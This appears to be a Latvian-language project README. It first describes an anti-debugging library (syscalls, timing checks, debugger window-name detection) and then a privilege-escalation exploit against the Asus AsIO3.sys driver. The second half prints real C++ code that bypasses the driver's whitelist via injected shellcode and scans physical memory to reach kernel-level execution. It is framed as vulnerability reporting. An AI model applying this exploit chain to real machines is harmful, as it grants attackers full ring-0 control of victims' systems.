# Anti-DBG (Library & Test Project)
**Projekta mērķis** : Palīdz sargāt programmas intelektuālo vērtību no uzbrucējiem. (x64dbg, cheat-engine, ollydbg)  
**Kur tiek pielietots** : Video Spēlēs, Anti Vīrusos, Licenzētās Programmās.  

<sub>Viens no vispopulārākajiem debugging rīkiem. (x64dbg)</sub>
![alt text](https://x64dbg.com/img/slide2.png)

### Izmantojam syscall (system-call) priekšrocības, lai izvairītos no uzbrucēju modifikācijām.
```cpp

BOOL InitSyscalls(sSysCallData * pSysCallData)
{
	LOAD_SYSCALL(NtWriteVirtualMemory);
	LOAD_SYSCALL(NtReadVirtualMemory);
	LOAD_SYSCALL(NtAllocateVirtualMemory);
	LOAD_SYSCALL(NtFreeVirtualMemory);
	LOAD_SYSCALL(NtDeviceIoControlFile);
	LOAD_SYSCALL(NtCreateProcess);
	LOAD_SYSCALL(NtCreateUserProcess);
	LOAD_SYSCALL(NtQueryInformationProcess);
	LOAD_SYSCALL(NtTerminateProcess);
	LOAD_SYSCALL(NtSetInformationThread);
	LOAD_SYSCALL(NtGetContextThread);
	LOAD_SYSCALL(NtQueryPerformanceCounter);
	LOAD_SYSCALL(NtQuerySystemInformation);

	return true;
}
```
```cpp
NTSTATUS status = do_syscall<NTSTATUS>(SysCallData.NtQueryInformationProcess, hProcess, ProcessDebugPort, &found, sizeof(DWORD), NULL);
```

### Izmantojam VMProtect, lai apmulsinātu un sarežģitu darbu uzbrucējiem
```cpp
__forceinline bool AntiDebug::Interals::CheckWindowClassName()
{
	VMProtectBeginVirtualization(("CheckWindowClassName"));

  //CODE HERE

	VMProtectEnd();

	return true;
}
```

### Izmantojam dažādus paņemienus, lai noteiktu vai programmu cenšās uzlauzt uzbrucējs
**RDTSC(Read Time-Stamp Counter) - Processora cikla skaita balstīts paņēmiens**  
<sub>Nav efektīvākais un precīzākais paņēmiens, tomēr bieži sastopams.</sub>
```cpp
__forceinline bool AntiDebug::Interals::CheckRDTSC()
{
	VMProtectBeginMutation("CheckRDTSC");
  //CODE HERE
	TimeKeeper timeKeeper = { 0 };
	_RDTSCx64(&timeKeeper);

	timeA = timeKeeper.timeUpperA;
	timeA = (timeA << 32) | timeKeeper.timeLowerA;

	timeB = timeKeeper.timeUpperB;
	timeB = (timeB << 32) | timeKeeper.timeLowerB;

	// 0x100000 is purely based on the CPU clock speed
	if (timeB - timeA > 0x100000)
		found = TRUE;

	if (found)
	{
		// MORE CODE HERE
	}

	VMProtectEnd();

	return true;
}
```

**NtSetInformationThread(ThreadHideFromDebugger) - Paņemiens**  
<sub>Bieži sastopmas, DRM vai Anti Vīrusu programmās.</sub>
```cpp
bool AntiDebug::AddProtectedThread(DWORD ThreadID)
{
	VMProtectBeginVirtualization("AddProtectedThread");

	auto ThreadHideFromDebugger = static_cast<(THREAD_INFORMATION_CLASS)>(0x11);

	// There is nothing to check here after this call.
	if (do_syscall<NTSTATUS>(SysCallData.NtSetInformationThread, GetCurrentThread(), ThreadHideFromDebugger, 0, 0) != 0x0)
		return false;

	for (auto & entry : AntiDebug::Interals::m_ProtectedThread)
	{
		if (entry == ThreadID)
			return true;
	}

	AntiDebug::Interals::m_ProtectedThread.push_back(ThreadID);

	VMProtectEnd();

	return true;
}
```  

**FindWindowA - Paņemiens**  
<sub>Dažreiz pietiek ar vienkāršiem risinājumiem, lai uzbrucējs padotos.</sub>
```cpp
__forceinline bool AntiDebug::Interals::CheckWindowClassName()
{
	VMProtectBeginVirtualization(("CheckWindowClassName"));

	static std::vector<IAString> WindowClassNames = {
		XorString("OLLYDBG"), XorString("ID"), XorString("ProcessHacker"),
		XorString("WindowsForms10.Window.8.app.0.13965fa_r6_ad1")
	};

	for (auto & str : WindowClassNames)
	{
		hWindow = WinApi.FindWindowA(str.GetValue().c_str(), 0);
		if (hWindow != NULL)
		{
			found = true;
			break;
		}
	}

	if (found)
	{
    //CODE HERE
	}

	VMProtectEnd();

	return true;
}
```
<sub>Pārējie paņēmieni aplūkojami projektā.</sub>

# asio3_interface & asio3_shellcode

**Projekta mērķis** : Asus drivera vājības izmantošana, lai iegūtu **RING-0** privilēģijas    
**Kur tiek pielietots** : Lai ziņotu uzņēmumam par vājībām produkta drošībā.  

<sub>RING-0 ir līmenis Windows operētājsistēmā, kam ir piekļuve pilnīgi visiem resursiem.</sub>  

<sub>Bildē aplūkojamas asus izplatītās un licenzētās programmas, kurās vājības tika konstatētas un tiek pielietotas vēl šodien.</sub>
![alt text](https://i.gyazo.com/cae4dbb5f4c00d8174c57325721754ce.png)

### Vājibas simptomi
**ZwMapViewOfSection** - Šinī gadījumā tiek izmantos, lai sasaistītu virtuālo atmiņu ar fizikālo atmiņu. (RAM)  
**ZwUnmapViewOfSection** - Šinī gadījumā tiek izmantos, lai atbrīvotu virtuālo atmiņu.  
<sub>Bildē aplūkojamas asus drivera (AsIO3.sys) importētās funckijas.</sub>
![alt text](https://i.gyazo.com/b9fbd64e3e3e6b4f7b90a2ae3cccf7b7.png)  
<sub>Bildē aplūkojamas kods no (AsIO3.sys), kā tiek veikta piekļuve fizikālajai atmiņai.</sub>
![alt text](https://i.gyazo.com/4e34262c0d0bf70186d83370dfaa6226.png)  

### Esošā aizsardzība un tās trūkumi  
![alt text](https://i.gyazo.com/a2d84b36355d2d6d78b07bd6eb118213.png)  
<sub>Bildē aplūkojamas (AsIO3.sys) šobrīdējā aizsardzība.</sub>  
Pēc bildes varam secināt, ka notiek pārbaude, salīdzinot procesa unikālo indeksu vai tā saturu.

### Aizsargmūra nojaukšana
Bruņots ar šo informāciju dzimst projekts **asio3_shellcode**

Tā mērķis? Izmantot aplūkotās vājības un pievienoties aizsardzības baltajā sarakstā(whitelistā)

![alt text](https://i.gyazo.com/2bcc74f87e3e39790d0e8ecbcbe1cca7.png)  
<sub>Bildē aplūkojam, kā tiek veikta pievienošanās baltajam sarakstam.</sub>  

### Nonākšana RING-0
Puscīņa ir uzverēta nonākot baltajā sarakstā, tomēr tas dod mums piekļuvi datora fiziskajai atmiņai, ne kontrollei visiem datora resurisiem.  
Aplūkosim, kā strādā asio3_interface, lai no šīs vājības izpiestu tās pilno potenciālu.

```cpp
bool asio3_interface::initialize_interface()
{

    //Attach to AsIO3.sys, if function fails then AsIO3 protection is still active
    this->device_handle = WinApi.CreateFileA(this->symbolic_link.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

    //Check if the handle to the AsIO3.sys driver is valid, if not load the driver manually.
    DWORD last_error = GetLastError();
    printf("[initialize_interface] handle(0x%llX) last_error(0x%lX)\n", this->device_handle, last_error);
    if ((!this->device_handle || this->device_handle == INVALID_HANDLE_VALUE) && last_error == ERROR_ACCESS_DENIED)
    {
        printf(XorString("[initialize_interface] driver already loaded\n"));
        this->driver_name = XorString("AsIO3");
        //Driver already loaded
    }
    else
    {
        //Driver not loaded
        if (!this->load_driver(&this->driver_name))
        {
            printf(XorString("[initialize_interface] Failed loading driver"));
            return false;
        }

        this->driver_load_performed = true;
    }

    //Load the asio3 shellcode into AsusCertService.exe to whitelist current process (Large function best seen in code)
    if (!this->bypass_handle_protection())
    {
        printf(XorString("[initialize_interface] initialize_interface step 2 failed\n"));
        this->on_exit();
        return false;
    }

    //Try retrieving the handle for the driver once more
    this->device_handle = WinApi.CreateFileA(this->symbolic_link.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

    if (!this->device_handle || this->device_handle == INVALID_HANDLE_VALUE)
    {
        printf(XorString("[initialize_interface] Failed creating valid handle\n"));
        this->on_exit();
        return false;
    }

    //If succesfull map NtShutdownProcess syscall to current process memory
    if (!this->map_syscall())
    {
        printf(XorString("[initialize_interface] Failed to map specified memory region\n"));
        this->on_exit();
        return false;
    }

    return true;
}
```

Tātad izmantojam Windows API funkciju **CreateFileA**, lai secinātu vai AsIO3.sys driveris eksistē mūsu sistēmā.  
Pēc tam apejam drivera aizsardzību saucot locālo funckiju **bypass_handle_protection** un visbeidzot izmantojam doto  
piekļuvi datora fiziskajai atmiņai, lai iegūtu iespēju palaist savu kodu RING-0 līmenī, saucot funkciju **map_syscall**.

```cpp
bool asio3_interface::map_syscall()
{
    //Locate the NtShutdownSystem function virtual address inside ntoskrnl.exe
    this->syscall_page_offset = reinterpret_cast<ULONG>(
        this->get_kernel_export(XorString("ntoskrnl.exe"), XorString("NtShutdownSystem"), true));

    //If function doesn't exist return
    if (!this->syscall_page_offset)
    {
        return false;
    }

    ULONG syscall_rva = this->syscall_page_offset;

    //Get the relative virtual address to the current memory page
    this->syscall_page_offset = this->syscall_page_offset % PAGE_SIZE;

    //Load windows main kernel component locally to use for memory scanning in RAM
    HMODULE ntoskrnl_local_buffer = (LoadLibraryExA(XorString("ntoskrnl.exe"), NULL, DONT_RESOLVE_DLL_REFERENCES));

    //If function failed return false
    if (!ntoskrnl_local_buffer)
    {
        return false;
    }

    //Allocate memory for bytes that we will scan for
    this->syscall_bytes.reserve(64); this->syscall_bytes.resize(64);

    //Copy the NtShutDownSystem functions first 64 bytres into the this->syscall_bytes array (vector)
    memcpy(this->syscall_bytes.data(), reinterpret_cast<PVOID>((ULONG64)ntoskrnl_local_buffer + syscall_rva), this->syscall_bytes.size());

    //Use windows registry to get currently present physical memoryies ranges
    std::vector<std::pair<ULONG64, ULONG>> phys_mem_ranges = this->get_physical_mem_ranges();

    //If there are no physical ranges function fails
    if (!phys_mem_ranges.size())
    {
        return false;
    }

    //For each phsyical range, scan each 2mb and 4096 byte memory page until we find the physical page containing NtShutdownSystem function
    for (auto& range : phys_mem_ranges)
    {
        this->physmeme_map_syscall(range.first, range.second);
    }

    //Check if we have found the syscall
    if (!this->syscall_located.load())
    {
        return false;
    }

    return true;
}

```



